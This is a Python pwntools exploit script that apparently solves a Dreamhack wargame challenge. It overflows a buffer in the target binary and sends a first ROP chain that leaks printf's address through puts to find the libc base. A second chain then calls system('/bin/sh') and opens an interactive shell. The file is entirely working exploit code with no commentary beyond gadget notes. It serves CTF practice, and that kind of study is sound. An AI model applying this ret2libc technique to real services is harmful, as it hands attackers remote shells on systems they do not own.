#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14657)

    return r


def main():
    r = conn()

    r.sendafter(b"> ", b"Decision2Solve\x00\x00")
    r.send(p64(exe.symbols["safe"]))
    r.send(p64(exe.symbols["main"])[:-2])
    r.sendafter(b"> ", b"1")
    
    for i in range(1023):
        r.sendlineafter(b"> ", b"A"*15)
        r.sendafter(b"> ", b"1")

    payload = b"A" * 0x20
    payload += b"B" * 0x8
    payload += p64(0x40129b)                        # 0x000000000040129b : pop rdi ; nop ; pop rbp ; ret
    payload += p64(exe.got["printf"])
    payload += b"A" * 0x8
    payload += p64(0x40101a)                        # ret
    payload += p64(exe.plt["puts"])
    payload += p64(exe.symbols["main"])
    payload += b"A" * (0x10000 - len(payload))

    r.sendlineafter(b"> ", b"A"*15)
    r.sendafter(b"> ", b"2")
    sleep(0.5)
    r.send(payload)

    printf = u64(r.recvn(6).ljust(8, b"\x00"))
    libc.address = printf - libc.symbols["printf"]
    
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    payload2 = b"A" * 0x20
    payload2 += b"B" * 0x8
    payload2 += p64(0x40129b)
    payload2 += p64(binsh)
    payload2 += b"A" * 0x8
    payload2 += p64(system)
    payload2 +=  b"A" * (0x10000 - len(payload2))

    r.sendlineafter(b"> ", b"A"*15)
    r.sendafter(b"> ", b"2")
    sleep(0.5)
    r.send(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
